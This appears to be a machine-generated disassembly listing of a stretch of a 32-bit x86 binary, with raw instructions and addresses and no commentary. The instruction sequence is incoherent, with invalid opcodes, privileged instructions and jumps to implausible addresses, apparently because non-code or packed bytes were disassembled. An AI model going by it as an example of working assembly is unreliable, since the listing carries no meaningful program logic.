  402fe3:	test   ebx,ecx
  402fe5:	cmovne ecx,DWORD PTR [edi-0x38f0ffc5]
  402fec:	test   al,0xd4
  402fee:	add    BYTE PTR [ebp+0x45fcf88b],al
  402ff4:	into   
  402ff5:	xor    ecx,ebx
  402ff7:	add    ecx,DWORD PTR [ebp-0x77]
  402ffa:	mov    edx,esp
  402ffc:	fadd   QWORD PTR [ebp-0x49]
  402fff:	mov    eax,DWORD PTR [esi]
  403001:	nop
  403002:	into   
  403003:	add    cl,dl
  403005:	mov    edx,ebx
  403007:	mov    edx,DWORD PTR [ebp+0x3c]
  40300a:	invd   
  40300c:	mov    BYTE PTR [ebp+0x0],al
  40300f:	mov    ecx,DWORD PTR [ebx-0x3dffe774]
  403015:	mov    ecx,DWORD PTR [ecx+0x3e41889]
  40301b:	push   ebp
  40301c:	push   ebp
  40301d:	cmp    ecx,DWORD PTR [ebx+0x488b3875]
  403023:	fmul   DWORD PTR [ecx+0x28dd000]
  403029:	call   0xf847bbef
  40302e:	rcl    esi,1
  403030:	rcl    ebx,0x45
  403033:	call   DWORD PTR [eax+0x50]
  403036:	inc    edx
  403037:	jne    0x40303c
  403039:	jmp    DWORD PTR [eax]
  40303b:	sbb    al,0xe8
  40303d:	dec    ebp
  40303e:	or     BYTE PTR [ebx+0x49555400],cl
  403044:	mov    ebp,DWORD PTR [ebx]
  403046:	sbb    BYTE PTR [ebx],al
  403048:	dec    eax
  403049:	and    BYTE PTR [ebx],dh
  40304b:	push   eax
  40304c:	add    edi,DWORD PTR [ebx]
  40304e:	cmp    eax,DWORD PTR [eax]
  403050:	je     0x402fdd
  403052:	push   ecx
  403053:	and    BYTE PTR [ebp-0x79],cl
  403056:	add    eax,DWORD PTR [ecx]
  403058:	or     al,0x0
  40305a:	inc    eax
  40305b:	adc    BYTE PTR [ebx],al
  40305d:	inc    ebp
  40305e:	and    bh,bh
  403060:	push   eax
  403061:	push   esp
  403062:	sub    DWORD PTR [ebp+0x0],esi
  403065:	push   edx
  403066:	mov    ecx,eax
  403068:	sbb    BYTE PTR [eax],al
  40306a:	dec    ebp
  40306b:	mov    ecx,DWORD PTR [ebx-0x3fbe1fe0]
  403071:	add    esi,DWORD PTR [ebx]
  403073:	jge    0x72cd3ac1
  403079:	add    DWORD PTR [eax],eax
  40307b:	mov    DWORD PTR [ebp+0x18],edx
  40307e:	mov    DWORD PTR [ebp+0x18],ecx
  403081:	cmovne edx,DWORD PTR [eax+0xf]
  403085:	xor    edx,DWORD PTR [edx+0x3]
  403088:	xor    ecx,DWORD PTR [ecx-0x2e74f3d5]
  40308e:	or     al,0x84
  403090:	rol    DWORD PTR [eax],cl
  403092:	dec    ebp
  403093:	add    BYTE PTR [ebx],bh
  403095:	dec    ebp
  403096:	jbe    0x4030cb
  403098:	mov    eax,DWORD PTR [ebx]
  40309a:	cld    
  40309b:	mov    DWORD PTR [edi+0x4d01e0],edx
  4030a1:	bswap  esi
  4030a3:	push   eax
  4030a4:	retf   
  4030a5:	xor    ecx,DWORD PTR [ebp+0x2b]
  4030a8:	mov    ebp,DWORD PTR [ebx]
  4030aa:	and    BYTE PTR [ecx],bh
  4030ac:	or     ah,al
  4030ae:	daa    
  4030af:	xchg   DWORD PTR [edi+0x100],eax
  4030b5:	push   ebp
  4030b6:	push   ebp
  4030b7:	adc    DWORD PTR [edx+0x8],0x55
  4030bb:	push   ebp
  4030bc:	xor    ebp,ebx
  4030be:	add    ecx,DWORD PTR [ebx+0x40551852]
  4030c4:	dec    DWORD PTR [ebp+0x45ffff54]
  4030ca:	sbb    al,0x8b
  4030cc:	rol    BYTE PTR [ebp-0x8fe8b7c],0x0
  4030d3:	and    eax,DWORD PTR [ebp+0x3]
  4030d6:	mov    edx,eax
  4030d8:	enter  0x8b,0x4
  4030dc:	mov    eax,DWORD PTR [ebp+0x33]
  4030df:	push   eax
  4030e0:	add    esp,DWORD PTR [edi-0x74f5fff1]
  4030e6:	add    ah,bh
  4030e8:	add    DWORD PTR [ebp-0x28],0xffffff8b
  4030ec:	mov    eax,0xd64f08
  4030f1:	ror    DWORD PTR [ecx-0x3fe83b36],cl
  4030f7:	mov    esp,DWORD PTR [esi+0x8]
  4030fa:	inc    ebp
  4030fb:	dec    eax
  4030fc:	mov    eax,0x44f8b
  403101:	inc    ebp
  403102:	mov    DWORD PTR [ecx-0x38],edx
  403105:	call   0xc338ca
  40310a:	or     BYTE PTR [ebp-0x75],al
  40310d:	mov    esp,DWORD PTR [esi-0x24]
  403110:	inc    ebp
  403111:	push   ebp
  403112:	mov    eax,0x284e83
  403117:	into   
  403118:	mov    DWORD PTR [edx+ecx*8-0x31cd7661],ecx
  40311f:	mov    eax,DWORD PTR [ebp+0xc]
  403122:	lea    eax,[ebp+0x45]
  403125:	mov    edi,DWORD PTR [ecx+0xb78adc]
  40312b:	push   es
  40312c:	xor    eax,esi
  40312e:	mov    edx,0x453bd0
  403133:	sub    eax,DWORD PTR [ebx]
  403135:	mov    edi,edi
  403137:	loopne 0x403141
  403139:	retf   0x837d
  40313c:	push   es
  40313d:	dec    ebp
  40313e:	mov    DWORD PTR [ebx+0xc78c72],ecx
  403144:	lods   al,BYTE PTR ds:[esi]
  403145:	xor    edx,edx
  403147:	add    esi,DWORD PTR [eax]
  403149:	mov    DWORD PTR [ebp+0x18],eax
  40314c:	xlat   BYTE PTR ds:[ebx]
  40314d:	dec    ebp
  40314e:	sar    BYTE PTR [ebx],cl
  403150:	(bad)  
  403151:	jne    0x403107
  403153:	mov    esp,edx
  403155:	fsub   st,st(7)
  403157:	add    BYTE PTR [ebp-0x73],al
  40315a:	xor    al,ch
  40315c:	in     al,dx
  40315d:	mov    eax,edi
  40315f:	hlt    
  403160:	mov    esp,0xd3d3d2d6
  403165:	mov    eax,edi
  403167:	in     al,0xc0
  403169:	jb     0x403158
  40316b:	push   ecx
  40316c:	inc    ebp
  40316d:	push   eax
  40316e:	jle    0x4030f5
  403170:	leave  
  403171:	cmove  esi,esp
  403174:	lods   al,BYTE PTR ds:[esi]
  403175:	add    BYTE PTR [eax],dl
  403177:	mov    esi,edx
  403179:	or     al,0x80
  40317b:	(bad)  
  40317c:	xor    al,0x1
  40317e:	mov    BYTE PTR [eax],al
  403180:	or     DWORD PTR [ecx],0x17
  403183:	into   
  403184:	in     al,dx
  403185:	retf   
  403186:	xchg   DWORD PTR [ecx+eax*1+0x4d000001],eax
  40318d:	gs push ecx
  40318f:	add    BYTE PTR [eax+0x27],dl
  403192:	mov    eax,DWORD PTR [eax]
  403194:	fsub   DWORD PTR [esi+0x0]
  403197:	inc    ebp
  403198:	lea    eax,[ebx-0x76affd54]
  40319e:	push   ecx
  40319f:	(bad)  
  4031a0:	lea    ebx,[ecx]
  4031a2:	fadd   DWORD PTR [eax]
  4031a4:	mov    esp,DWORD PTR [esi-0x74]
  4031a7:	inc    ebp
  4031a8:	add    BYTE PTR [ebx+0x65ff08ff],al
  4031ae:	mov    eax,DWORD PTR [eax]
  4031b0:	fmul   st,st(0)
  4031b2:	ror    BYTE PTR [ecx-0x4aba33c6],0xeb
  4031b9:	add    BYTE PTR [ebx-0x27b2769a],cl
  4031bf:	inc    bp
  4031c1:	inc    ebp
  4031c2:	je     0x40314f
  4031c4:	mov    ecx,DWORD PTR [eax]
  4031c6:	sbb    BYTE PTR [edi+ecx*4-0x3c],al
  4031ca:	add    DWORD PTR [ebx+0x0],eax
  4031cd:	add    BYTE PTR [ecx],dl
  4031cf:	jmpw   0x81db
  4031d3:	or     cl,BYTE PTR [ebx+0x668c00]
  4031d9:	retf   0x453b
  4031dc:	jne    0x403161
  4031de:	mov    ecx,DWORD PTR [eax]
  4031e0:	in     al,0x66
  4031e2:	(bad)
  4031e6:	add    BYTE PTR [ebp+0x52],al
  4031e9:	retf   0xec03
  4031ec:	mov    edi,eax
  4031ee:	sbb    al,0xb0
  4031f0:	inc    ebp
  4031f1:	call   0x463f654d
  4031f6:	and    al,ch
  4031f8:	and    ah,ch
  4031fa:	inc    edi
  4031fc:	test   DWORD PTR [eax+0x3fc3e90f],edi
  403202:	add    BYTE PTR [ebp-0x1],al
  403205:	ror    BYTE PTR [esp+ebp*8],cl
  403208:	(bad)  
  403209:	data16 jne 0x403251
  40320c:	call   0x729fe
  403211:	ret    0x33c0
  403214:	test   BYTE PTR [ebp-0x75fff300],cl
  40321a:	inc    ebp
  40321b:	or     BYTE PTR [ebx-0x3015dfb6],0x41
  403222:	sub    BYTE PTR [eax],dl
  403224:	(bad)  
  403225:	stc    
  403226:	test   DWORD PTR [edx+0xf],esi
  403229:	mov    ebx,DWORD PTR [ecx+0x570000d8]
  40322f:	lea    esi,[ebp-0x3c]
  403232:	call   0xff452d36
  403237:	pop    eax
  403239:	add    DWORD PTR [eax+eax*1+0x52005500],eax
  403240:	xchg   edi,edi
  403242:	add    DWORD PTR [eax],ecx
  403244:	add    BYTE PTR [ebp+0x55],cl
  403247:	push   ecx
  403248:	cmp    ecx,DWORD PTR [edi+0x8b0175]
  40324e:	fdiv   DWORD PTR [ecx]
  403250:	add    al,dl
  403252:	lea    eax,[ebp-0x18]
  403255:	test   edi,edi
  403257:	je     0x403241
  403259:	mov    DWORD PTR [ebp+0x8],ecx
  40325c:	dec    DWORD PTR [edx]
  40325e:	push   esp
  40325f:	add    bh,bh
  403261:	inc    ebp
  403262:	sbb    al,0x3b
  403264:	push   ebp
  403265:	or     BYTE PTR [ebx+0x50c80d],cl
  40326b:	mov    ecx,DWORD PTR [ebx+0x300338c]
  403271:	cmp    esi,DWORD PTR [ebp+esi*2-0x75]
  403275:	mov    ecx,DWORD PTR [eax+ebx*1]
  403278:	inc    ecx
  403279:	pop    edi
  40327b:	add    DWORD PTR [eax],ecx
  40327d:	add    BYTE PTR [ebp+0x7511f811],ah
  403283:	push   ebp
  403284:	dec    DWORD PTR [ebx+0xf69014]
  40328a:	or     BYTE PTR [ebx+0x11752800],cl
  403290:	adc    DWORD PTR [eax-0x61],0x660c008b
  403297:	push   eax
  403298:	jno    0x40330f
  40329a:	add    ebp,eax
  40329c:	push   edx
  40329d:	clc    
  40329e:	sar    bh,1
  4032a0:	xchg   eax,eax
  4032a2:	add    DWORD PTR [eax+eax*1-0x7ff7b00],eax
  4032a9:	jne    0x4032b5
  4032ab:	mov    eax,DWORD PTR [ebp-0x1]
  4032ae:	mov    esp,DWORD PTR [eax]
  4032b0:	sub    BYTE PTR [edx+eax*8-0x1],ah
  4032b4:	rol    BYTE PTR [ebp-0x5174f0bb],1
  4032ba:	loopne 0x4032bc
  4032bc:	dec    ebp
  4032bd:	mov    ecx,DWORD PTR [ecx+0x1855c70c]
  4032c3:	mov    eax,DWORD PTR [eax]
  4032c5:	call   0xffbe28ca
  4032ca:	add    al,al
  4032cc:	add    al,0x84
  4032ce:	add    BYTE PTR gs:[eax],al
  4032d1:	add    BYTE PTR [ebp-0x1],al
  4032d4:	jmp    0x4032f6
  4032d6:	xor    ecx,eax
  4032d8:	pop    edi
  4032d9:	call   FWORD PTR [ebx-0x7b]
  4032dc:	ret    0xf
  4032df:	mov    BYTE PTR [ebx+0x518b0f00],cl
  4032e5:	mov    WORD PTR [edi],cs
  4032e7:	add    BYTE PTR [ecx-0x75],al
  4032ea:	push   ebx
  4032eb:	and    BYTE PTR [ebx],dh
  4032ed:	adc    BYTE PTR [ebp-0x7a78f7e6],cl
  4032f3:	add    DWORD PTR [eax+eax*1-0x75],esi
  4032f7:	dec    ebp
  4032f8:	or     al,0x51
  4032fa:	sbb    al,0x75
  4032fc:	cmp    DWORD PTR [ebx+0x710ce408],ecx
  403302:	pop    eax
  403303:	push   edx
  403304:	add    edx,DWORD PTR [eax+0x3]
  403307:	mov    edi,DWORD PTR [ecx]
  403309:	and    BYTE PTR [eax],cl
  40330b:	xchg   DWORD PTR [edx],ecx
  40330d:	add    eax,eax
  40330f:	add    BYTE PTR [edi+0x0],al
  403312:	cli    
  403313:	(bad)  
  403314:	loope  0x4032d9
  403316:	shl    BYTE PTR [edi],0x5b
  403319:	dec    ebp
  40331a:	ret    0x8b
  40331d:	sub    BYTE PTR [ebx+0x28388345],cl
  403323:	pushf  
  403324:	inc    ebp
  403325:	mov    edi,DWORD PTR [eax]
  403327:	or     BYTE PTR [ebp+esi*2+0x59e481c7],bl
  40332e:	test   DWORD PTR [eax],eax
  403330:	clc    
  403331:	inc    DWORD PTR [ebp+0x10]
  403334:	cmp    al,dh
  403336:	pushf  
  403337:	jb     0x4032f1
  403339:	add    BYTE PTR [edi+0x9],cl
  40333c:	add    BYTE PTR [esi],dl
  40333e:	mov    edx,eax
  403340:	hlt    
  403341:	inc    eax
  403343:	(bad)  
  403344:	data16 rol BYTE PTR [ebp+0x0],1
  403348:	mov    eax,0x9c4f3b
  40334d:	jmp    0x4032d8
  40334f:	mov    edi,eax
  403351:	or     al,0xc0
  403353:	inc    eax
  403354:	add    ax,WORD PTR [ebp-0x1]
  403358:	mov    ecx,DWORD PTR [ecx+0x4545e008]
  40335e:	mov    ecx,DWORD PTR [ebx+0x1451c0c]
  403364:	mov    eax,DWORD PTR [ebp-0x10]
  403367:	add    DWORD PTR [ecx+0x7830800],edi
  40336d:	sbb    cl,al
  40336f:	jne    0x4032fc
  403371:	sub    esp,0x20
  403374:	lahf   
  403375:	mov    esi,DWORD PTR [edx]
  403377:	and    BYTE PTR [ebx],al
  403379:	add    dl,BYTE PTR [edi-0x40]
  40337c:	lock pop esi
  40337e:	test   cl,cl
  403380:	add    DWORD PTR [eax+eax*1],ebx
  403383:	push   ebp
  403384:	inc    ebp
  403385:	in     al,dx
  403386:	mov    esi,DWORD PTR [edi-0x483ef918]
  40338c:	ret    0xf014
  40338f:	push   edi
  403390:	test   bh,bh
  403392:	add    DWORD PTR [eax+eax*1+0x18],eax
  403396:	inc    ebp
  403397:	shl    BYTE PTR [ebx],cl
  403399:	pop    ds
  40339a:	add    ecx,DWORD PTR [eax-0x77]
  40339d:	(bad)  
  40339e:	loopne 0x4033d1
  4033a0:	inc    ebp
  4033a1:	pop    ebp
  4033a2:	xor    esi,DWORD PTR [edx+0x3]
  4033a5:	mov    ecx,DWORD PTR [ecx-0x482623f8]
  4033ab:	fdivp  st(4),st
  4033ad:	pop    ebp
  4033ae:	mov    bh,0x72
  4033b0:	hlt    
  4033b1:	add    DWORD PTR [ebx+0x28],0x0
  4033b5:	cmp    esp,DWORD PTR [esi+0x72]
  4033b8:	lock xor eax,DWORD PTR [ebx+0x5f]
  4033bc:	add    BYTE PTR [ebp+0x66],bl
  4033bf:	add    al,0xfb
  4033c1:	push   ebp
  4033c2:	or     ch,ah
  4033c4:	add    ah,ch
  4033c6:	data16 (bad) 
  4033c8:	lock lock add eax,DWORD PTR [ebp+0x4566f82b]
  4033d0:	jge    0x40340d
  4033d2:	mov    ebx,DWORD PTR [eax+eiz*8+0x66d87dc7]
  4033d9:	test   DWORD PTR [eax+edi*8],esi
  4033dc:	data16 adc al,0x75
  4033df:	add    BYTE PTR [ebx+0x7d45dc66],cl
  4033e5:	and    DWORD PTR [esi+0x60],0x34
  4033e9:	mov    DWORD PTR [esi-0x4],esp
  4033ec:	jne    0x403421
  4033ee:	mov    esi,0x667200
  4033f3:	inc    ebp
  4033f4:	or     BYTE PTR [ebx-0x76742000],al
  4033fa:	lock clc 
  4033fc:	mov    eax,DWORD PTR [ebp+0xc]
  4033ff:	mov    edi,esi
  403401:	in     al,dx
  403402:	or     BYTE PTR [ebp+0x0],al
  403405:	mov    esi,edi
  403407:	call   0x534f7947
  40340c:	sbb    bl,BYTE PTR [ecx+0x0]
  40340f:	push   ecx
  403410:	mov    esi,DWORD PTR [ebx]
  403412:	lock push esi
  403414:	pop    ebp
  403415:	jne    0x40344a
  403417:	mov    edx,0x3b7203
  40341c:	retw   0x3b7d
  403420:	minpd  xmm7,xmm0
  403424:	str    WORD PTR [ebp+0x66f0008b]
  40342b:	jne    0x40340c
  40342d:	xor    eax,DWORD PTR [ebx+eax*1+0xf003b00]
  403434:	mov    esp,esi
  403436:	cld    
  403437:	add    BYTE PTR [ebx-0x75],al
  40343a:	add    al,dh
  40343c:	sar    bx,0xc2
  403440:	mov    eax,DWORD PTR [ebp+0x8]
  403443:	mov    eax,DWORD PTR [ebx]
  403445:	lock rcr di,0xc2
  40344a:	es inc ebp
  40344c:	mov    ecx,DWORD PTR [edi]
  40344e:	clc    
  40344f:	jne    0x403494
  403451:	(bad)  
  403453:	jge    0x4034bb
  403455:	mov    eax,0x8b8afb
  40345a:	or     BYTE PTR [ebx],dh
  40345c:	add    edi,DWORD PTR [ebx+0xdf8a66]
  403462:	push   cs
  403463:	xor    esi,DWORD PTR [edi-0x48c4f748]
  403469:	add    ah,dh
  40346b:	add    edi,ebx
  40346d:	mov    ax,di
  403470:	or     dh,bh
  403472:	mov    ecx,DWORD PTR [ecx+0x7543f4fc]
  403478:	add    BYTE PTR [ebx-0x7404139a],cl
  40347e:	mov    esi,DWORD PTR [edi+0xc]
  403481:	mov    DWORD PTR [ebx],eax
  403483:	or     BYTE PTR [esi+0x75],ah
  403486:	fisttp WORD PTR [ebx-0x747417da]
  40348c:	clc    
  40348d:	ja     0x4034d2
  40348f:	mov    DWORD PTR [eax],eax
  403491:	or     al,0x66
  403493:	lahf   
  403494:	sti    
  403495:	add    BYTE PTR [ebx+0x3010ce9],cl
  40349b:	add    BYTE PTR [esi+0x7d],ah
  40349e:	fbld   TBYTE PTR [esi+0xe]
  4034a1:	pop    ebp
  4034a2:	mov    bh,0x81
  4034a4:	or     al,0x59
  4034a6:	mov    bh,0x0
  4034a8:	hlt    
  4034a9:	add    edi,ebx
  4034ab:	mov    di,bx
  4034ae:	or     al,0x84
  4034b0:	mov    eax,DWORD PTR [ecx]
  4034b2:	or     al,0x0
  4034b4:	mov    edi,DWORD PTR [ebp+0x8]
  4034b7:	mov    edi,DWORD PTR [ebx]
  4034b9:	adc    BYTE PTR [edi],cl
  4034bb:	stc    
  4034bc:	mov    ebx,0x8bdf00fa
  4034c1:	mov    ebx,eax
  4034c3:	or     al,0x5d
  4034c5:	mov    esi,DWORD PTR [ebx]
  4034c7:	or     BYTE PTR [ebp+0x72001f84],cl
  4034cd:	add    BYTE PTR [eax],al
  4034cf:	cmp    edi,DWORD PTR [ebp+0xf]
  4034d2:	mov    ecx,DWORD PTR [ebp+0x665d00d8]
  4034d8:	xor    edi,DWORD PTR [ebp-0x73]
  4034db:	mov    ebx,0x728a1f
  4034e0:	add    BYTE PTR [ebx],dh
  4034e2:	jge    0x40354a
  4034e4:	mov    ebx,DWORD PTR [ebp-0x20]
  4034e7:	pop    bp
  4034e9:	clc    
  4034ea:	cmp    di,WORD PTR [edx+esi*2]
  4034ee:	data16 data16 jge 0x40356f
  4034f2:	mov    edi,DWORD PTR [ebx+0x5d8adc]
  4034f8:	xor    di,WORD PTR [esi+eiz*2]
  4034fc:	pop    bp
  4034fe:	jge    0x403566
  403500:	mov    edi,eax
  403502:	lock cmp ecx,DWORD PTR [ebx-0x8f0f789]
  403509:	jge    0x403513
  40350b:	ltr    WORD PTR [ebp-0x2]
  40350f:	add    edi,DWORD PTR [ebx]
  403511:	hsubpd xmm4,xmm0
  403515:	data16 (bad) 
  403517:	jge    0x4034a4
  403519:	mov    ebx,0xf18ae4
  40351e:	dec    ebp
  40351f:	xor    eax,DWORD PTR [ebx]
  403521:	minpd  xmm6,xmm1
  403525:	data16 jne 0x403520
  403528:	jmp    0x403565
  40352a:	mov    esi,DWORD PTR [edx-0x10]
  40352d:	sar    WORD PTR [ebp+0x4d],1
  403531:	mov    ebx,0xa8a8d
  403536:	jb     0x40356b
  403538:	add    BYTE PTR [esi+0x4d],ah
  40353b:	pop    ebp
  40353c:	mov    esp,DWORD PTR [esi-0x20]
  40353f:	clc    
  403540:	jne    0x40357d
  403542:	data16 ja 0x403579
  403545:	jnp    0xf14f9bc8
  40354b:	pop    ebp
  40354c:	inc    ebx
  40354d:	add    eax,DWORD PTR [eax]
  40354f:	data16 data16 jge 0x403545
  403553:	data16 mov ch,0x7d
  403556:	add    BYTE PTR [esi+0x66],ah
  403559:	pop    ebp
  40355a:	icebp  
  40355b:	sbb    di,bx
  40355e:	jne    0x4034e5
  403560:	mov    eax,DWORD PTR [eax]
  403562:	call   0x77bdc067
  403567:	mov    ebp,DWORD PTR [ebx]
  403569:	in     al,dx
  40356a:	data16 stc 
  40356c:	repnz mov esp,0x32759f3b
  403572:	xor    ecx,DWORD PTR [ecx+0x7d33eceb]
  403578:	inc    eax
  403579:	mov    eax,DWORD PTR [edi]
  40357b:	call   0xbc742ec5
  403580:	add    ebx,DWORD PTR [edi-0x76a4cda1]
  403586:	ret    0xe8
  403589:	jge    0x403516
  40358b:	mov    edx,DWORD PTR [ecx-0x14]
  40358e:	mov    ecx,DWORD PTR [ebx-0x76f584aa]
  403594:	add    BYTE PTR [eax],cl
  403596:	data16 jge 0x403567
  403599:	mov    eax,DWORD PTR [ebx-0x18]
  40359c:	add    BYTE PTR [ebx-0x7631849a],cl
  4035a2:	mov    ch,0xc
  4035a4:	add    BYTE PTR [ebp-0x39],bh
  4035a7:	data16 cld 
  4035a9:	pop    ebp
  4035aa:	test   DWORD PTR [ecx+0x3859f8],eax
  4035b0:	pushf  
  4035b1:	add    esp,DWORD PTR [esi+0x66]
  4035b4:	into   
  4035b5:	fistp  WORD PTR [ebp-0x7b]
  4035b8:	push   edi
  4035b9:	(bad)  
  4035ba:	mov    bh,0xff
  4035bc:	mov    edi,0xff338d75
  4035c1:	mov    ebx,DWORD PTR [ecx-0x10]
  4035c4:	push   ecx
  4035c5:	repnz mov ebx,0x894faf
  4035cb:	lock cmp edx,DWORD PTR [edx]
  4035ce:	jne    0x403625
  4035d0:	mov    DWORD PTR [ebx],esi
  4035d2:	cld    
  4035d3:	mov    edx,DWORD PTR [edi-0x1c]
  4035d6:	xor    ecx,DWORD PTR [ebx+ecx*4+0x6632339f]
  4035dd:	mov    DWORD PTR [esp+eiz*8-0x749baac2],ecx
  4035e4:	mov    ebx,0x8b3bec
  4035e9:	push   esi
  4035ea:	sub    ecx,eax
  4035ec:	mov    ebx,0xba8a2b
  4035f1:	mov    dh,BYTE PTR [ebx]
  4035f3:	add    BYTE PTR [ebx+0xb94e33],bh
  4035f9:	dec    esi
  4035fa:	cmp    eax,DWORD PTR [eax]
  4035fc:	jne    0x403639
  4035fe:	mov    esi,DWORD PTR [ebp-0x4]
  403601:	mov    ebx,DWORD PTR [ebx-0x24]
  403604:	stc    
  403605:	jge    0x40358c
  403607:	data16 clc 
  403609:	xor    al,0x9
  40360b:	data16 into 
  40360d:	lock test BYTE PTR [ebx],dh
  403610:	inc    eax
  403611:	data16 fs icebp 
  403614:	pop    esi
  403615:	add    al,0xc3
  403617:	ror    BYTE PTR [ebx+0x57c0510c],0xeb
  40361e:	inc    ebp
  40361f:	mov    edi,DWORD PTR [ecx]
  403621:	in     al,0x9c
  403623:	sar    DWORD PTR [esi-0x7a17a3e],0xc9
  40362a:	pop    ebx
  40362b:	or     al,0xff
  40362d:	push   ebp
  40362e:	mov    ebp,esp
  403630:	mov    ah,BYTE PTR [esi+0x4]
  403633:	or     BYTE PTR [esi+edi*4],dh
  403636:	cmp    al,0x3b
  403638:	je     0x40363a
  40363a:	mov    ebp,DWORD PTR [ebx]
  40363c:	mov    edx,0xff8a8dbe
  403641:	add    BYTE PTR [ecx+0x33],bl
  403644:	push   ecx
  403645:	mov    esi,0x8b4e53
  40364a:	mov    ebx,0x393b45
  40364f:	pushf  
  403650:	sub    edi,DWORD PTR [edx-0x7757a45]
  403656:	add    BYTE PTR [ebx],bh
  403658:	xor    esi,DWORD PTR [ebx+edi*4+0x53]
  40365c:	dec    edi
  40365d:	str    ecx
  403660:	cmp    esp,DWORD PTR [ecx+0x75]
  403663:	int    0x89
  403665:	mov    esi,0x77208fc
  40366a:	xor    edx,DWORD PTR [ecx]
  40366c:	mov    eax,DWORD PTR [eax]
  40366e:	xor    esp,DWORD PTR [esi-0x73]
  403671:	retf   
  403672:	push   edi
  403673:	add    esp,ebp
  403675:	push   ebp
  403676:	add    BYTE PTR [ebp-0x293cfee8],cl
  40367c:	cmp    dl,0x4a
  40367f:	(bad)  
  403680:	sti    
  403681:	mov    esi,DWORD PTR [ebp+0x78]
  403684:	mov    esp,ebp
  403686:	cld    
  403687:	add    BYTE PTR ds:0xf800850a,bh
  40368d:	data16 or al,0xcb
  403690:	rol    DWORD PTR [ebx-0x37],0x0
  403694:	mov    DWORD PTR [esi+0x47],esp
  403697:	retf   
  403698:	in     eax,0xb5
  40369a:	add    BYTE PTR [eax],al
  40369c:	(bad)  
  40369d:	pop    si
  40369f:	retf   
  4036a0:	ret    
  4036a1:	enter  0x4d8b,0x51
  4036a5:	pop    edi
  4036a6:	mov    DWORD PTR [ecx-0x637ac604],0x333874f8
  4036b0:	pushf  
  4036b1:	(bad)  
  4036b2:	call   0x2634ff
  4036b7:	add    BYTE PTR [ebx+0x3b55bac9],cl
  4036bd:	in     al,dx
  4036be:	add    BYTE PTR [esi+0x2b],dl
  4036c1:	(bad)  
  4036c2:	mov    edx,0x858afc
  4036c7:	clc    
  4036c8:	xor    edi,DWORD PTR [eax]
  4036ca:	mov    edx,0xe84e9c
  4036cf:	(bad)  
  4036d0:	cmp    edi,edi
  4036d2:	je     0x4036cc
  4036d4:	push   ebx
  4036d5:	pop    es
  4036d6:	sysenter 
  4036d8:	leave  
  4036d9:	dec    edx
  4036da:	popa   
  4036db:	jle    0x4036aa
  4036dd:	popa   
  4036de:	mov    edi,0x76108c7
  4036e3:	int    0x67
  4036e5:	mov    ecx,0x7660800
  4036ea:	retf   
  4036eb:	add    ax,WORD PTR [eax]
  4036ee:	jne    0x4036fa
  4036f0:	lea    eax,[eax]
  4036f2:	add    DWORD PTR [esi-0x9],esp
  4036f5:	ret    
  4036f6:	(bad)  
  4036f7:	inc    ebx
  4036f8:	xlat   BYTE PTR ds:[ebx]
  4036f9:	add    BYTE PTR [ebx-0x1a3caf9a],cl
  4036ff:	add    BYTE PTR [bx+si],al
  403702:	or     ah,BYTE PTR [esi+0x0]
  403705:	ret    
  403706:	add    cx,bx
  403709:	jne    0x40374e
  40370b:	lea    eax,[eax]
  40370d:	add    DWORD PTR [esi-0xf],esp
  403710:	retf   
  403711:	(bad)  
  403712:	mov    ch,0xd1
  403714:	add    BYTE PTR [esi+eiz*2-0x379b34c2],al
  40371b:	mov    bh,BYTE PTR [ebp-0x80]
  40371e:	cmp    DWORD PTR [esp+ebx*4],esi
  403721:	repz pop edi
  403723:	xor    BYTE PTR [esi+edi*2+0x33],0xc3
  403728:	inc    eax
  403729:	inc    ebp
  40372a:	add    bl,BYTE PTR [ebx-0x40]
  40372d:	cmp    ecx,ecx
  40372f:	pushf  
  403730:	push   ebp
  403731:	je     0x40371f
  403733:	xor    ecx,DWORD PTR [ebx-0x4899f7cd]
  403739:	mov    WORD PTR [esi+0x3e],ss
  40373c:	and    DWORD PTR [esp+eax*8-0x75],0xc9435fff
  403744:	add    BYTE PTR [ebp+0x57],dl
  403747:	in     al,dx
  403748:	(bad)  
  403749:	push   esi
  40374a:	mov    ch,0x45
  40374c:	add    BYTE PTR [ecx],bh
  40374e:	mov    DWORD PTR [esp+edi*8+0x74853bbe],ebx
  403755:	clc    
  403756:	mov    edx,edx
  403758:	or     bh,bh
  40375a:	ret    0x4566
  40375d:	or     bl,ch
  40375f:	or     cl,BYTE PTR [ebx-0x7699f800]
  403765:	retf   0x4383
  403768:	add    al,BYTE PTR [eax]
  40376a:	mov    bh,0x66
  40376c:	adc    dl,cl
  40376e:	iret   
  40376f:	mov    ch,0xc7
  403771:	add    ah,al
  403773:	dec    dx
  403776:	(bad)  
  403777:	push   edi
  403778:	mov    ch,0x57
  40377a:	add    BYTE PTR [edi-0x7207459a],dh
  403780:	(bad)  
  403782:	rcr    BYTE PTR [ecx+0x66],0x51
  403786:	add    bh,BYTE PTR [ebx+0x5e4f45]
  40378c:	ret    0x3b
  40378f:	jne    0x40371c
  403791:	mov    DWORD PTR [ebx+0x457218fc],eax
  403797:	xor    edi,DWORD PTR [eax]
  403799:	mov    ebx,DWORD PTR [ebx+esi*1-0x73179939]
  4037a0:	test   DWORD PTR [esi],edi
  4037a2:	clc    
  4037a3:	fs inc ebp
  4037a5:	mov    ebx,0x83b35
  4037aa:	pop    es
  4037ab:	sub    ebx,DWORD PTR [edi-0x7675cd45]
  4037b1:	add    al,bh
  4037b3:	xor    eax,DWORD PTR [ebp-0x45]
  4037b6:	xor    BYTE PTR [esi-0x64],cl
  4037b9:	add    bh,al
  4037bb:	cmp    esi,esp
  4037bd:	jne    0x403744
  4037bf:	cmp    eax,0x3a8545fc
  4037c5:	clc    
  4037c6:	pushf  
  4037c7:	pop    ebx
  4037c8:	mov    eax,DWORD PTR ds:0xeb59c0ec
  4037ce:	push   ecx
  4037cf:	xor    ecx,DWORD PTR [ebx-0x7b3c07a2]
  4037d5:	mov    ebx,DWORD PTR [edi-0x74bacdaf]
  4037db:	psubsb mm1,QWORD PTR [eax]
  4037de:	icebp  
  4037df:	lea    ecx,[eax]
  4037e1:	test   BYTE PTR [edi],0xff
  4037e4:	sar    DWORD PTR [esi+0x8a72],0x55
  4037eb:	xor    ecx,DWORD PTR [edi]
  4037ed:	mov    edi,0xc24ed1
  4037f2:	adc    DWORD PTR [ebp+0x0],0x66
  4037f6:	add    bh,al
  4037f8:	inc    ebp
  4037f9:	sub    ecx,DWORD PTR [ebx-0x3ed407bb]
  4037ff:	mov    DWORD PTR [ebp+0x8],ecx
  403802:	add    DWORD PTR [ebx],0x66514559
  403808:	or     DWORD PTR [edx],0xf32c29f
  40380e:	cmp    edi,DWORD PTR [esi+esi*2]
